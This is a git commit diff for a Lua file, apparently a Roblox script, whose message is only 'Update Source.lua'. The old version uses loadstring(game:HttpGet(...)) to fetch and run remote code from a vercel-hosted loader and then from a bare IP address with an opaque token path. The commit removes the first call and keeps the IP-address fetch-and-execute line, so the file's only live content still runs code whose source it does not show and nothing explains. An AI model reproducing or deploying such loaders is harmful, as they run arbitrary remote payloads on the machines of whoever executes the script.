7101788a0be4054061b5f8e8f1949700d3bbead1
cxzyue <jadematthew49@gmail.com>
2026-05-28 12:03:20 +0800

    Update Source.lua

--- Source.lua
+++ Source.lua
@@ -1,7 +1,1 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://levi-hub-x.vercel.app/Loader.lua"))()
-    
-    task.wait(5)
-    
-    loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
-end)
+loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
